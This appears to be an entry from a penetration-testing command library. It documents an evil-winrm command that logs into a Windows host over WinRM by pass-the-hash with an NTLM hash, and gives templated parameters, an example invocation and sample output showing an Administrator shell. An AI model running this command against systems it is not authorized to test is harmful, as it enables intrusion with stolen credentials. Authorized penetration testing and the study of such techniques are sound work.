---
id: 66a97e96-09c1-4dbb-9144-83910cd3424e
name: evil-winrm-rb-connect-with-ntlm-hash
type: command
executor: bash
data: evil-winrm.rb -i $_TARGET_IP -u $_USERNAME -H $_NTLM_HASH
output: >-
  root@kali:~/Documents/evil-winrm# ./evil-winrm.rb -i 10.10.10.10 -u
  Administrator -H 'FD030F3D045072C0508748D1C953862B'


  Evil-WinRM shell v2.3


  Info: Establishing connection to remote endpoint


  *Evil-WinRM* PS C:\Users\Administrator\Documents>
created_at: '2020-03-16T02:05:05.221748+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
tags:
  - winrm
  - pth
verified: true
validated: true
---

# evil-winrm-rb-connect-with-ntlm-hash

## Command

```bash
evil-winrm.rb -i $_TARGET_IP -u $_USERNAME -H $_NTLM_HASH
```

## Description

Connects to WinRM using NTLM hash for PtH.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -i $_TARGET_IP | Target IP | Yes |
| -u $_USERNAME | Username | Yes |
| -H $_NTLM_HASH | 32-char NTLM hash | Yes |

## Examples

### Basic Usage

```bash
evil-winrm.rb -i 10.10.10.10 -u admin -H aad3b435b51404eeaad3b435b51404ee
```

## Expected Output

*Evil-WinRM* PS C:\Users\>

## Related

- [[procedures/Connect-to-WinRM-from-Linux-via-Pass-the-Hash]]
